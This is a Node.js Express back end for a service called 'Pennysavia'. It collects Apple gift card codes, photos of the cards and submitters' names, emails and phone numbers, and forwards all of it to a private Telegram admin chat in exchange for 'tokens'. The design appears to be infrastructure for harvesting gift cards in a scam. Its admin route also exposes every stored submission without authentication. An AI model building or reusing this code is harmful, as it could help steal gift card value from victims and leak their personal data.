const express = require('express')
const cors = require('cors')
const axios = require('axios')
const FormData = require('form-data')
require('dotenv').config()

const app = express()
app.use(cors())
app.use(express.json({ limit: '10mb' }))

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
const CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID

if (!BOT_TOKEN || !CHAT_ID) {
  console.warn('Warning: TELEGRAM_BOT_TOKEN or TELEGRAM_ADMIN_CHAT_ID not set. Set them in .env for Telegram forwarding to work.')
}

// In-memory storage for gift card submissions (demo — use DB in production)
let submissions = []

app.get('/', (req, res) => {
  res.json({ ok: true, message: 'Pennysavia backend running' })
})

app.post('/api/send-telegram', async (req, res) => {
  try {
    if (!BOT_TOKEN || !CHAT_ID) return res.status(500).json({ error: 'Server not configured with TELEGRAM_BOT_TOKEN/TELEGRAM_ADMIN_CHAT_ID' })

    const { images, code } = req.body || {}
    if (!images || !Array.isArray(images) || images.length < 1) {
      return res.status(400).json({ error: 'No images provided' })
    }

    // Send a text message first with the code
    const messageText = `🎁 New Apple gift card submission:\n💾 Code: ${code}\n📷 Images: ${images.length} file(s)`
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: messageText
    })

    // Send each image as a photo
    for (let i = 0; i < images.length; i++) {
      const b64 = images[i]
      // strip data url prefix if present
      const parts = b64.split(',')
      const dataPart = parts.length > 1 ? parts[1] : parts[0]
      const buffer = Buffer.from(dataPart, 'base64')

      const form = new FormData()
      form.append('chat_id', CHAT_ID)
      form.append('photo', buffer, { filename: `gift-card-${Date.now()}-${i}.jpg` })

      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
        headers: form.getHeaders(),
        maxContentLength: Infinity,
        maxBodyLength: Infinity
      })
    }

    return res.json({ ok: true })
  } catch (err) {
    console.error('Telegram send error', err?.response?.data || err.message || err)
    return res.status(500).json({ error: 'Failed to forward to Telegram' })
  }
})

app.post('/api/submit-giftcard', async (req, res) => {
  try {
    const { fullName, email, phone, amount, images, userId, userName } = req.body
    
    if (!fullName || !email || !phone || !amount || !images || images.length < 2) {
      return res.status(400).json({ error: 'Missing required fields' })
    }

    const submission = {
      id: Date.now().toString(),
      timestamp: new Date().toISOString(),
      fullName,
      email,
      phone,
      amount,
      userId,
      userName,
      status: 'pending',
      images
    }

    submissions.push(submission)

    // Send to Telegram
    if (BOT_TOKEN && CHAT_ID) {
      try {
        const messageText = `
🎁 **NEW GIFT CARD SUBMISSION**
👤 Name: ${fullName}
📧 Email: ${email}
📱 Phone: ${phone}
💰 Amount: $${amount}
🪙 Tokens: ${Math.floor(amount / 50)}
🆔 User ID: ${userId}
⏰ Timestamp: ${new Date().toLocaleString()}
        `.trim()

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          chat_id: CHAT_ID,
          text: messageText,
          parse_mode: 'Markdown'
        })

        // Send images
        for (let i = 0; i < images.length; i++) {
          const b64 = images[i]
          const parts = b64.split(',')
          const dataPart = parts.length > 1 ? parts[1] : parts[0]
          const buffer = Buffer.from(dataPart, 'base64')

          const form = new FormData()
          form.append('chat_id', CHAT_ID)
          form.append('photo', buffer, { filename: `giftcard-${submission.id}-${i}.jpg` })

          await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
            headers: form.getHeaders(),
            maxContentLength: Infinity,
            maxBodyLength: Infinity
          })
        }
      } catch (tgErr) {
        console.error('Telegram notification error:', tgErr.message)
        // Continue even if Telegram fails
      }
    }

    return res.json({ 
      ok: true, 
      message: 'Gift card submission received',
      submissionId: submission.id
    })
  } catch (err) {
    console.error('Submit giftcard error:', err.message)
    return res.status(500).json({ error: 'Failed to submit gift card' })
  }
})

app.get('/api/admin/submissions', (req, res) => {
  // Demo: no auth required for now — add auth in production
  return res.json({ submissions })
})

app.patch('/api/admin/submissions/:id', (req, res) => {
  const { id } = req.params
  const { status } = req.body

  const submission = submissions.find(s => s.id === id)
  if (!submission) {
    return res.status(404).json({ error: 'Submission not found' })
  }

  submission.status = status // 'approved', 'rejected', etc.
  return res.json({ ok: true, submission })
})

const PORT = process.env.PORT || 4000
app.listen(PORT, () => {
  console.log(`✅ Pennysavia backend listening on port ${PORT}`)
})
